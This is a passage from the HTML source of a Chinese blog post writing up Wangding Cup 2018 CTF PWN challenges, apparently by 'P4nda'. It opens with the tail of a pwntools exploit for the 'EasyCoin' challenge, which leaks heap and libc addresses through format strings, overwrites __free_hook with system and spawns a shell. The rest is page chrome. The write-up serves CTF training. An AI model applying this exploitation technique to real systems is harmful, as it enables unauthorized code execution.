class="keyword">def</span> <span class="title">send_coin</span><span class="params">(username, money)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(username)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(money))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_transactpn</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.send(password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">reg(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">reg(<span class="string">'/bin/sh\n'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'\x02'</span>)</span><br><span class="line">login(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'%9$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">heap_base = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.send(<span class="string">'%3$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'\x7f'</span>)[:<span class="number">-2</span>], <span class="number">16</span>)- <span class="number">0xf72c0</span><span class="comment">#- 7 - libc.symbols['__write_nocancel'] </span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] heap  :'</span>,hex(heap_base)</span><br><span class="line">send_coin(<span class="string">'/bin/sh\n'</span>,<span class="number">0x111</span>)</span><br><span class="line">delete()</span><br><span class="line">reg(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">login(<span class="string">'p4nda\n'</span>,<span class="string">'pwn\n'</span>)</span><br><span class="line">send_coin(<span class="string">'/bin/sh\n'</span>,heap_base+<span class="number">0x100</span>)</span><br><span class="line">send_coin(<span class="string">'p4nda\n'</span>,<span class="number">0x3333</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">login(<span class="string">'/bin/sh'</span>,p64(heap_base+<span class="number">0x30</span>))</span><br><span class="line">send_coin(<span class="string">'/bin/sh'</span>,<span class="number">0x4444</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400b0f')</span></span><br><span class="line">change_password(p64(heap_base+<span class="number">0xa0</span><span class="number">-0x10</span>))</span><br><span class="line">logout()</span><br><span class="line">reg(<span class="string">"i_am_padding\n"</span>,p64(heap_base+<span class="number">0xd0</span>)+p64(libc.symbols[<span class="string">'__free_hook'</span>])+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0</span>)[:<span class="number">-1</span>])</span><br><span class="line">login(<span class="string">'/bin/sh'</span>,<span class="string">'\n'</span>)</span><br><span class="line">change_password(p64(libc.symbols[<span class="string">'system'</span>])+<span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
+        <p><span>发布时间:</span>2018-08-27, 16:05:49</p>
+        <p><span>最后更新:</span>2018-08-27, 22:37:47</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/27/WDBCTF-2018/" title="网鼎杯CTF部分PWN题复现">http://p4nda.top/2018/08/27/WDBCTF-2018/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/08/27/WDBCTF-2018/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/07/27/CISCN-Final/">
+                    CISCN 2018 Final赛记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#blind"><span class="toc-number">1.</span> <span class="toc-text">blind</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目简介"><span class="toc-number">1.1.</span> <span class="toc-text">题目简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EasyCoin"><span class="toc-number">2.</span> <span class="toc-text">EasyCoin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#功能分析"><span class="toc-number">2.1.</span> <span class="toc-text">功能分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"网鼎杯CTF部分PWN题复现　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://p4nda.top/2018/08/27/WDBCTF-2018/';
+            this.page.identifier = '2018/08/27/WDBCTF-2018/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//p4nda.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/07/27/CISCN-Final/" title="下一篇: CISCN 2018 Final赛记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【kernel pwn】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【kernel pwn】CISCN 2018 CTF core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB CTF 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 P4nda
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 天黑了~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":0.5,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
+</html>
